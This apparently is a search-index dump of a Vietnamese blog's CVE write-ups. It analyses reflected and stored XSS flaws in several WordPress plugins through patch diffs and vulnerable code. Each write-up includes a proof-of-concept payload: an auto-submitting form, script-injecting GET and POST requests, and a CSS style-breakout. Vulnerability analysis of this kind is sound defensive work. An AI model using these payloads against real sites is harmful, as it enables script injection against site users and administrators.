th·ª±c hi·ªán h√†nh ƒë·ªông b·ªã thao t√∫ng (v√≠ d·ª•: b·∫•m v√†o m·ªôt li√™n k·∫øt). CVE ID: CVE-2025-6832 Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 2.0 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Product: WordPress All in One Time Clock Lite Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - All in One Time Clock Lite: v2.0 (vulnerable) v√† v2.0.1 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. Analysis Patch diff Trong phi√™n b·∫£n vulnerable, tham s·ªë nonce ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ $_POST m√† kh√¥ng qua b·∫•t k·ª≥ sanitization n√†o: $nonce = (isset($_POST[\"nonce\"])) ? $_POST[\"nonce\"] : null; Trong phi√™n b·∫£n patched, tham s·ªë nonce ƒë∆∞·ª£c x·ª≠ l√Ω b·∫±ng sanitize_text_field() tr∆∞·ªõc khi s·ª≠ d·ª•ng, ngƒÉn ch·∫∑n vi·ªác ch√®n m√£ ƒë·ªôc: $nonce = (isset($_POST[\"nonce\"])) ? sanitize_text_field($_POST[\"nonce\"]) : null; üëâ B·∫£n v√° b·ªï sung l·ªõp l·ªçc ƒë·∫ßu v√†o cho bi·∫øn nonce, ƒë·∫£m b·∫£o d·ªØ li·ªáu nh·∫≠n t·ª´ request s·∫Ω ƒë∆∞·ª£c lo·∫°i b·ªè k√Ω t·ª± nguy hi·ªÉm tr∆∞·ªõc khi x·ª≠ l√Ω ti·∫øp. So s√°nh thay ƒë·ªïi m√£ gi·ªØa b·∫£n vulnerable v√† b·∫£n v√° Vulnerable code L·ªó h·ªïng n·∫±m trong h√†m aio_time_clock_lite_js() thu·ªôc class AIO_Time_Clock_Lite_Actions trong file aio-time-clock-lite-actions.php{: .filepath} public function aio_time_clock_lite_js() { // other logic $nonce = (isset($_POST[\"nonce\"])) ? $_POST[\"nonce\"] : null; if (wp_verify_nonce($nonce, 'time-clock-nonce')) { // other logic } else { echo json_encode( [ \"response\" =\u003e \"failed\", \"message\" =\u003e esc_attr_x(\"Not authorized to perform this action\", 'aio-time-clock-lite'), \"nonce\" =\u003e $nonce, \"clock_action\" =\u003e $clock_action, ] ); } wp_reset_postdata(); die(); } {: file=‚Äúaio-time-clock-lite-actions.php‚Äù} H√†m wp_verify_nonce() so s√°nh gi√° tr·ªã $nonce g·ª≠i t·ª´ client v·ªõi gi√° tr·ªã h·ª£p l·ªá m√† server ƒë√£ sinh ra tr∆∞·ªõc ƒë√≥ b·∫±ng h√†m wp_create_nonce(). \u003cinput type=\"hidden\" name=\"time-clock-nonce\" id=\"time-clock-nonce\" value=\"\u003c?php echo wp_create_nonce(\"time-clock-nonce\"); ?\u003e\"\u003e {: file=‚Äúaio-settings.php‚Äù} N·∫øu $nonce kh√¥ng h·ª£p l·ªá =\u003e nh·∫£y sang nh√°nh else tr·∫£ v·ªÅ JSON b√°o l·ªói ch·ª©a $nonce. Click 2 references ta th·∫•y h√†m public function aio_time_clock_lite_js() ƒë∆∞·ª£c g·ªçi l√†m callback cho c√°c action hook: H√†m aio_time_clock_lite_js() ƒë∆∞·ª£c g·∫Øn v√†o hai hook Ajax (authenticated \u0026 unauthenticated) wp_ajax_aio_time_clock_lite_js(authenticated). wp_ajax_nopriv_aio_time_clock_lite_js(unauthenticated). =\u003e Focus Sources \u0026 Sinks Source: Tham s·ªë nonce l·∫•y tr·ª±c ti·∫øp t·ª´ $_POST (unauthenticated request). Sink: Gi√° tr·ªã nonce ƒë∆∞·ª£c ph·∫£n chi·∫øu l·∫°i trong echo json_encode(...). Flow G·ª≠i POST request (unauthenticated) ƒë·∫øn /wp-admin/admin-ajax.php v·ªõi c√°c params: action=aio_time_clock_lite_js\u0026nonce=nonce_value Callback aio_time_clock_lite_js() ƒë∆∞·ª£c g·ªçi Ki·ªÉm tra gi√° tr·ªã nonce =\u003e invalid Ph·∫£n chi·∫øu gi√° tr·ªã nonce v√†o body b·∫±ng echo json_encode(...) Exploit Proof of Concept (PoC) T·∫°o trang web ch·ª©a form submit: \u003cform action=\"http://localhost/wp-admin/admin-ajax.php\" method=\"post\"\u003e \u003cinput type=\"hidden\" name=\"action\" value=\"aio_time_clock_lite_js\"\u003e \u003cinput type=\"hidden\" name=\"nonce\" value=\"\u003csvg onload=alert()\u003e\"\u003e \u003c/form\u003e \u003cscript\u003edocument.forms[0].submit()\u003c/script\u003e G·ª≠i link ƒë·∫øn trang web ch·ª©a form cho ng∆∞·ªùi d√πng cho d·∫∑c quy·ªÅn. Quan s√°t vi·ªác th·ª±c hi·ªán JavaScript ƒë∆∞·ª£c ti√™m. Result ‚Äî PoC execution screenshot Conclusion L·ªó h·ªïng CVE-2025-6832 trong plugin All in One Time Clock Lite \u003c= 2.0 cho ph√©p unauthenticated attacker khai th√°c Reflected XSS th√¥ng qua tham s·ªë nonce. B·∫£n v√° 2.0.1 ƒë√£ th√™m sanitize_text_field() ƒë·ªÉ l·ªçc input, ngƒÉn ch·∫∑n m√£ ƒë·ªôc ƒë∆∞·ª£c ph·∫£n chi·∫øu trong JSON response. Key takeaways: Lu√¥n sanitize v√† escape d·ªØ li·ªáu tr∆∞·ªõc khi tr·∫£ v·ªÅ","date":"2025-10-07","objectID":"/vi/posts/2025-10-07-cve-2025-6832/:0:0","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/vi/posts/2025-10-07-cve-2025-6832/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Download Manager Plugin.","date":"2025-10-06","objectID":"/vi/posts/2025-10-06-cve-2025-10146/","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/vi/posts/2025-10-06-cve-2025-10146/"},{"categories":["CVE Analyst"],"content":"L·ªó h·ªïng trong plugin Download Manager tr∆∞·ªõc phi√™n b·∫£n 3.3.24. D·ªØ li·ªáu ƒë∆∞·ª£c l·∫•y t·ª´ GET request ƒë∆∞·ª£c in tr·ª±c ti·∫øp v√†o HTML attribute, reflected XSS x·∫£y ra khi ng∆∞·ªùi d√πng c√≥ ƒë·∫∑c quy·ªÅn truy c·∫≠p v√†o ƒë∆∞·ªùng d·∫´n do attack cung c·∫•p. CVE ID: CVE-2025-10146 Product: WordPress Download Manager Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 3.3.23 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Download Manager: v3.3.23(vul) v√† v3.3.24(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Patch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file src/Admin/views/stats/history.php. B·∫£n l·ªói: \u003c?php if (!empty($user_ids)): ?\u003e \u003cdiv class=\"clear-filter\"\u003e \u003c?php $get_params_xu = $get_params; unset($get_params_xu['user_ids']); $reset_url = add_query_arg($get_params_xu, 'edit.php'); ?\u003e \u003ca href=\"\u003c?php echo $reset_url; ?\u003e\" class=\"clear-btn\" title=\"\u003c?php _e('Clear user filter', 'download-manager'); ?\u003e\"\u003e \u003ci class=\"fas fa-times\"\u003e\u003c/i\u003e \u003c/a\u003e \u003c/div\u003e \u003c?php endif; ?\u003e L·∫•y GET params v√† g√°n tr·ª±c ti·∫øp v√†o href c·ªßa th·∫ª \u003ca\u003e m√† kh√¥ng c√≥ c∆° ch·∫ø b·∫£o v·ªá =\u003e nguy c∆° reflected XSS. B·∫£n v√°: \u003c?php if (!empty($user_ids)): ?\u003e \u003cdiv class=\"clear-filter\"\u003e \u003c?php $get_params_xu = $get_params; unset($get_params_xu['user_ids']); $get_params_xu = \\WPDM\\__\\__::sanitize_array($get_params_xu, 'safetxt'); $reset_url = add_query_arg($get_params_xu, 'edit.php'); ?\u003e \u003ca href=\"\u003c?php echo esc_url($reset_url); ?\u003e\" class=\"clear-btn\" title=\"\u003c?php _e('Clear user filter', 'download-manager'); ?\u003e\"\u003e \u003ci class=\"fas fa-times\"\u003e\u003c/i\u003e \u003c/a\u003e \u003c/div\u003e \u003c?php endif; ?\u003e Patch Diff: sanitized GET parameters and escaped URL B·∫£n v√° ƒë√£ sanitize m·∫£ng GET params b·∫±ng sanitize_array v√† s·ª≠ d·ª•ng esc_url ƒë·ªÉ escape URL =\u003e an to√†n h∆°n. How It Work? Ta c·∫ßn t√¨m URL th·ª±c s·ª± ƒë·ªÉ inject GET params ch·ª©a XSS payload. src/Admin/views/stats/history.php ch·ª©a c√°c tag php, HTML v√† n·∫±m trong views cho th·∫•y file n√†y ƒë∆∞·ª£c include ·ªü n∆°i n√†o ƒë√≥ trong m√£ ngu·ªìn plugin. Ta t√¨m v·ªõi t·ª´ kh√≥a history.php trong th∆∞ m·ª•c plugin Search results for history.php üëâ Kh√¥ng c√≥ k·∫øt qu·∫£ n√†o kh·ªõp. Kh·∫£ nƒÉng cao n√≥ ƒë∆∞·ª£c include ƒë·ªông nh∆∞ n√†y {$file_name}.php. Ta t√¨m v·ªõi regex \\{.*\\}\\.php: Regex search for dynamic includes src/Admin/views/stats/history.php ƒë∆∞·ª£c include trong src/Admin/views/stats.php URL th·ª±c s·ª± ƒë·ªÉ truy c·∫≠p ƒë∆∞·ª£c khai b√°o ·ªü ƒë·∫ßu file stats.php $base_page_uri = \"edit.php?post_type=wpdmpro\u0026page=wpdm-stats\"; T∆∞∆°ng t·ª± history.php, stats.php c≈©ng ƒë∆∞·ª£c include ·ªü ƒë√¢u ƒë√≥ trong m√£ ngu·ªìn plugin. Nh∆∞ng kh√¥ng c·∫ßn quan t√¢m v√¨ ta ƒë√£ t√¨m ƒë∆∞·ª£c URL th·ª±c s·ª±. ƒê·ªÉ ch·∫Øc ch·∫Øn h∆°n, ta ƒë·∫∑t breakpoint t·∫°i v·ªã tr√≠ l·ªó h·ªïng trong file src/Admin/views/stats/history.php, sau ƒë√≥ b·∫Øt ƒë·∫ßu debug v√† truy c·∫≠p URL: edit.php?post_type=wpdmpro\u0026page=wpdm-stats Breakpoint debugging to observe GET params Tr∆∞·ªõc ti√™n, plugin l·∫•y to√†n b·ªô GET parameters v√†o $get_params. N·∫øu $user_ids kh√¥ng r·ªóng, plugin s·∫Ω t·∫°o n√∫t ‚ÄúClear filter‚Äù. ƒê·ªÉ l√†m n√∫t n√†y ho·∫°t ƒë·ªông, c·∫ßn m·ªôt URL m√† kh√¥ng c√≤n user_ids n·ªØa, n√™n plugin l√†m nh∆∞ sau: $get_params_xu = $get_params; // copy to√†n b·ªô GET parameters unset($get_params_xu['user_ids']); // b·ªè user_ids ra kh·ªèi m·∫£ng $reset_url = add_query_arg($get_params_xu, 'edit.php'); // t·∫°o URL m·ªõi unset($get_params_xu['user_ids']) =\u003e lo·∫°i b·ªè b·ªô l·ªçc user_ids kh·ªèi URL. add_query_arg($get_params_xu, 'edit.php') \u003e t·∫°o URL m·ªõi v·ªõi c√°c tham s·ªë c√≤n l·∫°i. Cu·ªëi c√πng, URL n√†y ƒë∆∞·ª£c g·∫Øn v√†o n√∫t ‚ÄúClear filter‚Äù: \u003ca href=\"\u003c?php echo $reset_url; ?\u003e\" class=\"clear-btn\"\u003e...\u003c/a\u003e K·∫øt qu·∫£: Khi ng∆∞·ªùi d√πng nh·∫•n n√∫t, trang s·∫Ω load l·∫°i m√† kh√¥ng c√≤n b·ªô l·ªçc user_ids, t·ª©c l√† ‚Äúclear filter‚Äù. Exploit Detect XSS G·ª≠i GET request ch·ª©a XSS payload: GET /wp-admin/edit.php?post_type=wpdmpro\u0026page=wpdm-stats\u0026user_ids[0]=1\u0026payload=\"\u003e\u003c/a\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e HTTP/1.1 Ta th√™m \"\u003e\u003c/a\u003e ƒë·ªÉ ƒë√≥ng th·∫ª \u003ca\u003e sau ƒë√≥ th√™m 1 script d·ªÉ alert() Reflected XSS triggered via GET parameter üëâ XSS th√†nh c√¥ng, khi ng∆∞·ªùi d√πng c√≥","date":"2025-10-06","objectID":"/vi/posts/2025-10-06-cve-2025-10146/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/vi/posts/2025-10-06-cve-2025-10146/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress ShopLentor Plugin.","date":"2025-10-05","objectID":"/vi/posts/2025-10-05-cve-2025-58990/","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/vi/posts/2025-10-05-cve-2025-58990/"},{"categories":["CVE Analyst"],"content":"L·ªó h·ªïng trong plugin ShopLentor tr∆∞·ªõc phi√™n b·∫£n 3.2.0 cho ph√©p k·∫ª t·∫•n c√¥ng c√≥ quy·ªÅn contributor ch√®n m√£ ƒë·ªôc v√†o CSS c·ªßa block. CSS n√†y sau ƒë√≥ ƒë∆∞·ª£c n·∫°p inline v√†o trang v√† c√≥ kh·∫£ nƒÉng d·∫´n t·ªõi Stored XSS khi ƒë∆∞·ª£c preview ho·∫∑c hi·ªÉn th·ªã trong tr√¨nh duy·ªát. CVE ID: CVE-2025-58990 Product: WordPress ShopLentor Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 3.2.0 CVSS severity: Low (6.5) Required Privilege: Contributor Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. ShopLentor: v3.2.0(vul) v√† v3.2.1(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Actived WooCommerce plugin: plugin b·∫Øt bu·ªôc actived tr∆∞·ªõc khi c√†i ShopLentor Plugin Analysis Patch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file woolentor-blocks/includes/classes/Manage_Styles.php. B·∫£n l·ªói: public function save_block_css( $request ){ $params = $request-\u003eget_params(); $post_id = sanitize_text_field( $params['post_id'] ); // Kh√¥ng ki·ªÉm tra quy·ªÅn user // Kh√¥ng l·ªçc n·ªôi dung CSS tr∆∞·ªõc khi l∆∞u update_post_meta( $post_id, '_woolentor_css', $params['block_css'] ); $wp_filesystem-\u003eput_contents( $dirname . $filename, $params['block_css'] ); } B·∫£n v√°: public function save_block_css( $request ){ $params = $request-\u003eget_params(); $post_id = sanitize_text_field( $params['post_id'] ); // Ch·ªâ admin ho·∫∑c t√°c gi·∫£ b√†i vi·∫øt m·ªõi ƒë∆∞·ª£c ph√©p $post = get_post( $post_id ); if ( ! $post || ( ! current_user_can('manage_options') \u0026\u0026 get_current_user_id() !== (int) $post-\u003epost_author ) ) { return ['success' =\u003e false, 'message' =\u003e __('No permission')]; } // L·ªçc d·ªØ li·ªáu tr∆∞·ªõc khi l∆∞u $block_css = $this-\u003esanitize_css_content( $params['block_css'] ); update_post_meta( $post_id, '_woolentor_css', $block_css ); $wp_filesystem-\u003eput_contents( $dirname . $filename, $block_css ); } B·∫£n v√° d√πng current_user_can(manage_options) ƒë·ªÉ ki·ªÉm tra c√≥ ph·∫£i admin kh√¥ng N·∫øu user l√† admin =\u003e v·∫ø ƒë·∫ßu ! current_user_can('manage_options') = false =\u003e c·∫£ bi·ªÉu th·ª©c \u0026\u0026 = false =\u003e qua ƒë∆∞·ª£c. N·∫øu user l√† author =\u003e v·∫ø sau get_current_user_id() !== (int) $post-\u003epost_author = false =\u003e c·∫£ bi·ªÉu th·ª©c \u0026\u0026 = false =\u003e qua ƒë∆∞·ª£c. Patch Diff How It Work? public function save_block_css( $request ){ try{ global $wp_filesystem; if ( ! $wp_filesystem || !function_exists('WP_Filesystem') ) { require_once( ABSPATH . 'wp-admin/includes/file.php' ); } $params = $request-\u003eget_params(); $post_id = sanitize_text_field( $params['post_id'] ); if ( $post_id == 'woolentor-widget' \u0026\u0026 $params['has_block'] ) { update_option( $post_id, $params['block_css'] ); return [ 'success' =\u003e true, 'message' =\u003e __('Widget CSS Saved.', 'woolentor') ]; } $filename = \"woolentor-css-{$post_id}.css\"; $upload_dir_url = wp_upload_dir(); $dirname = trailingslashit( $upload_dir_url['basedir'] ) . 'woolentor-addons/'; if ( $params['has_block'] ) { update_post_meta( $post_id, '_woolentor_active', 'yes' ); $all_block_css = $params['block_css']; WP_Filesystem( false, $upload_dir_url['basedir'], true ); if( ! $wp_filesystem-\u003eis_dir( $dirname ) ) { $wp_filesystem-\u003emkdir( $dirname ); } update_post_meta( $post_id, '_woolentor_css', $all_block_css ); if ( ! $wp_filesystem-\u003eput_contents( $dirname . $filename, $all_block_css ) ) { throw new \\Exception( __('You are not permitted to save CSS.', 'woolentor' ) ); } return [ 'success' =\u003e true, 'message' =\u003e__('WooLentor Blocks css file update.', 'woolentor' ) ]; } else { delete_post_meta( $post_id, '_woolentor_active' ); if ( file_exists( $dirname.$filename ) ) { wp_delete_file( $dirname.$filename ); } delete_post_meta( $post_id, '_woolentor_css' ); return [ 'success' =\u003e true, 'message' =\u003e __('WooLentor Blocks CSS Delete.', 'woolentor' ) ]; } } catch( \\Exception $e ){ return [ 'success' =\u003e false, 'message' =\u003e $e-\u003egetMessage() ]; } } H√†m save_block_css() thu·ªôc class Manage_Styles c√≥ nhi·ªám v·ª• l∆∞u ho·∫∑c x√≥a CSS tu·ª≥ theo block. ·ª®ng d·ª•ng s·∫Ω l·∫•y post_id v√† n·ªôi dung block_css t·ª´ request. Tr∆∞·ªùng h·ª£p ƒë·∫∑c bi·ªát: n·∫øu pos","date":"2025-10-05","objectID":"/vi/posts/2025-10-05-cve-2025-58990/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/vi/posts/2025-10-05-cve-2025-58990/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Authorsy Plugin.","date":"2025-10-04","objectID":"/vi/posts/2025-10-04-cve-2025-27006/","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/vi/posts/2025-10-04-cve-2025-27006/"},{"categories":["CVE Analyst"],"content":"L·ªó h·ªïng x·∫£y ra tr√™n plugin Authorsy c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.0.6. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng ch√®n m√£ ƒë·ªôc (v√≠ d·ª•: script chuy·ªÉn h∆∞·ªõng, qu·∫£ng c√°o, ho·∫∑c c√°c payload HTML kh√°c) v√†o website, v√† nh·ªØng m√£ ƒë√≥ s·∫Ω ƒë∆∞·ª£c th·ª±c thi khi kh√°ch truy c·∫≠p m·ªü trang. CVE ID: CVE-2025-27006 Product: WordPress Authorsy Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 1.0.5 CVSS severity: Medium (6.5) OWASP Top 10: A1: Broken Access Control Required Privilege: Subscriber Trong m√¥ t·∫£ y√™u c·∫ßu ƒë·∫∑c quy·ªÅn Subscriber nh∆∞ng th·ª±c ra c√≥ th·ªÉ khai th√°c Unauthenticated. Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Authorsy: v1.0.5(vul) v√† v1.0.6(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng c√≥ ch·ª©c nƒÉng t√πy ch·ªânh CSS, l∆∞u d·ªØ li·ªáu trong wp_options v√† ch√®n tr·ª±c ti·∫øp v√†o \u003cstyle\u003e tr√™n trang. Tuy nhi√™n, ng∆∞·ªùi d√πng c√≥ th·ªÉ t∆∞∆°ng t√°c v·ªõi API ƒë·ªÉ ch·ªânh s·ª≠a d·ªØ li·ªáu CSS m√† kh√¥ng b·ªã ki·ªÉm so√°t quy·ªÅn, d·∫´n ƒë·∫øn nguy c∆° Broken Access Control v√† c√≥ th·ªÉ XSS n·∫øu ch√®n payload ƒë·ªôc h·∫°i. Patch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü 2 file core/settings/api-settings.php v√† core/enqueue-inline/enqueue-inline.php Diff showing changes in enqueue-inline.php to sanitize custom CSS Diff showing REST API permission callback changes in api-settings.php Exploit Detect XSS G·ª≠i POST request ƒë·∫øn /wp-json/authorsy/v1/settings v·ªõi XSS payload: POST /wp-json/authorsy/v1/settings HTTP/1.1 Host: localhost Content-Type: application/json { \"primary_color\":\"\u003c/style\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\u003cstyle\u003e\" } Ta ƒë√≥ng th·∫ª \u003cstyle\u003e (CSS trong head) v√† inject th√™m th·∫ª \u003cscript\u003e ch·ª©a XSS payload. Truy c·∫≠p m·ªôt trang b·∫•t k·ª≥. XSS payload injected via custom CSS üëâ XSS th√†nh c√¥ng, inspect ƒë·ªÉ xem code ƒë∆∞·ª£c thay ƒë·ªïi nh∆∞ n√†o. \u003cstyle\u003e :root { --ea-color-main: \u003c/style\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\u003cstyle\u003e; } \u003c/style\u003e Conclusion L·ªó h·ªïng CVE-2025-27006 trong plugin Authorsy \u003c= 1.0.5 l√† m·ªôt v√≠ d·ª• ƒëi·ªÉn h√¨nh v·ªÅ Broken Access Control k·∫øt h·ª£p v·ªõi XSS. Nguy√™n nh√¢n ch√≠nh l√†: REST API kh√¥ng ki·ªÉm so√°t quy·ªÅn truy c·∫≠p: b·∫•t k·ª≥ user n√†o c≈©ng c√≥ th·ªÉ g·ªçi /wp-json/authorsy/v1/settings ƒë·ªÉ thay ƒë·ªïi c√°c option. CSS t√πy ch·ªânh ch∆∞a ƒë∆∞·ª£c sanitize: gi√° tr·ªã CSS ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp v√†o \u003cstyle\u003e trong \u003chead\u003e, cho ph√©p k·∫ª t·∫•n c√¥ng inject payload \u003cscript\u003e th√¥ng qua CSS. Nonce kh√¥ng ƒë∆∞·ª£c x·ª≠ l√Ω ƒë√∫ng: verify_nonce ch·ªâ tr·∫£ v·ªÅ WP_Error m√† kh√¥ng ngƒÉn code th·ª±c thi, khi·∫øn vi·ªác ki·ªÉm tra b·∫£o m·∫≠t g·∫ßn nh∆∞ v√¥ hi·ªáu. Key takeaways: REST API c·∫ßn ki·ªÉm so√°t quy·ªÅn: lu√¥n s·ª≠ d·ª•ng permission_callback h·ª£p l√Ω ƒë·ªÉ ngƒÉn Broken Access Control. Sanitize d·ªØ li·ªáu ng∆∞·ªùi d√πng tr∆∞·ªõc khi render trong HTML/CSS/JS ƒë·ªÉ ph√≤ng XSS. References Cross-site scripting (XSS) cheat sheet WordPress Authorsy Plugin \u003c= 1.0.5 is vulnerable to Cross Site Scripting (XSS) ","date":"2025-10-04","objectID":"/vi/posts/2025-10-04-cve-2025-27006/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/vi/posts/2025-10-04-cve-2025-27006/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Assistant Plugin.","date":"2025-10-03","objectID":"/vi/posts/2025-10-03-cve-2025-53307/","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/vi/posts/2025-10-03-cve-2025-53307/"},{"categories":["CVE Analyst"],"content":"L·ªó h·ªïng x·∫£y ra tr√™n plugin Assistant c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 3.6.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng ch√®n m√£ ƒë·ªôc (v√≠ d·ª•: script chuy·ªÉn h∆∞·ªõng, qu·∫£ng c√°o, ho·∫∑c c√°c payload HTML kh√°c) v√†o website, v√† nh·ªØng m√£ ƒë√≥ s·∫Ω ƒë∆∞·ª£c th·ª±c thi khi kh√°ch truy c·∫≠p m·ªü trang. CVE ID: CVE-2025-53307 Product: WordPress Assistant Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 1.5.2 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Assistant: v1.5.2(vul) v√† v1.5.3(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng hi·ªÉn th·ªã tr·ª±c ti·∫øp n·ªôi dung h√¨nh ·∫£nh do ng∆∞·ªùi d√πng cung c·∫•p th√¥ng qua URL m√† kh√¥ng x√°c th·ª±c v√† ki·ªÉm tra ƒë·∫ßy ƒë·ªß MIME type. ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn vi·ªác k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ cung c·∫•p m·ªôt t·∫≠p tin gi·∫£ d·∫°ng h√¨nh ·∫£nh v√† khi ƒë∆∞·ª£c tr√¨nh duy·ªát x·ª≠ l√Ω, n√≥ s·∫Ω th·ª±c thi m√£ ƒë·ªôc =\u003e g√¢y ra l·ªó h·ªïng XSS. Patch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. Diff gi·ªØa b·∫£n l·ªói v√† b·∫£n v√° Trong tr∆∞·ªùng h·ª£p n√†y, s·ª± kh√°c bi·ªát gi·ªØa 2 phi√™n b·∫£n kh√° nhi·ªÅu, ƒë·ªÉ thu·∫≠n l·ª£i cho vi·ªác truy v·∫øt, ta c√≥ th·ªÉ xem change log ƒë·ªÉ bi·∫øt b·∫£n v√° l·ªó h·ªïng XSS ·ªü ƒë√¢u: Changelog 1.5.3 ( 2025-09-08 ) - Changes to support the integration of Assistant in Beaver Builder version 2.10 - Fixed dark mode issues on the Home app and sidebar. - Security: Fixed a potential XSS vulnerability in the \"image proxy\" üëâ L·ªó h·ªóng n·∫±m trong file backend/src/Hooks/ImageProxy.php, ta quan s√°t s·ª± kh√°c bi·ªát c·ªßa 2 phi√™n b·∫£n: S·ª± kh√°c bi·ªát trong h√†m render_image c·ªßa ImageProxy.php S·ª± thay ƒë·ªïi x·∫£y ra ·ªü h√†m render_image v·ªõi ch·ª©c nƒÉng: Nh·∫≠n tham s·ªë url t·ª´ query string ($_GET['url']). G·ª≠i request t·ª´ server ƒë·∫øn URL ƒë√≥ ƒë·ªÉ t·∫£i n·ªôi dung. Ch·ªëng ssrf b·∫±ng wp_safe_remote_get. N·∫øu n·ªôi dung c√≥ header Content-Type b·∫Øt ƒë·∫ßu b·∫±ng image/, th√¨: G·ª≠i l·∫°i header Content-Type ƒë√≥ cho client. In (echo) to√†n b·ªô n·ªôi dung file ra cho tr√¨nh duy·ªát. Tr√¨nh duy·ªát hi·ªÉn th·ªã h√¨nh ·∫£nh kh√¥ng ph·∫£i tr·ª±c ti·∫øp t·ª´ ngu·ªìn g·ªëc m√† th√¥ng qua server WordPress. SVG c≈©ng c√≥ Content-Type b·∫Øt ƒë·∫ßu b·∫±ng image/ v√† c√≥ th·ªÉ ch·ª©a m√£ JavaScript b√™n trong =\u003e XSS c√≥ th·ªÉ x·∫£y ra. B·∫£n v√° ƒë√£ th√™m m·ªôt l·ªõp ki·ªÉm tra MIME type th·ª±c s·ª± c·ªßa file ƒë·ªÉ tr√°nh k·ªãch b·∫£n XSS b·∫±ng SVG hay file gi·∫£ m·∫°o. $filesystem = self::filesystem(); $tmpfile = tempnam( '/tmp', 'assistant' ); $filesystem-\u003eput_contents( $tmpfile, $body ); $validimage = wp_get_image_mime( $tmpfile ); $filesystem-\u003edelete( $tmpfile ); if ( ! $validimage ) { return false; } wp_get_image_mime() s·ª≠ d·ª•ng h√†m x·ª≠ l√Ω ·∫£nh n·ªôi b·ªô (d·ª±a tr√™n d·ªØ li·ªáu binary c·ªßa file) ƒë·ªÉ x√°c ƒë·ªãnh MIME th·ª±c s·ª±. N·∫øu k·∫øt qu·∫£ kh√¥ng ph·∫£i l√† ·∫£nh h·ª£p l·ªá =\u003e return false. How it work? Trong __construct c·ªßa class ImageProxy, ph∆∞∆°ng th·ª©c render_image() ƒë∆∞·ª£c g·ªçi th√¥ng qua callback c·ªßa action hook 'init'. Hook 'init' ƒë∆∞·ª£c th·ª±c thi r·∫•t s·ªõm trong qu√° tr√¨nh load WordPress, sau khi c√°c ƒë·ªëi t∆∞·ª£ng core ƒë∆∞·ª£c kh·ªüi t·∫°o nh∆∞ng tr∆∞·ªõc khi g·ª≠i output ra tr√¨nh duy·ªát. render_image ch·ªâ ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng hi·ªán t·∫°i c√≥ quy·ªÅn ch·ªânh 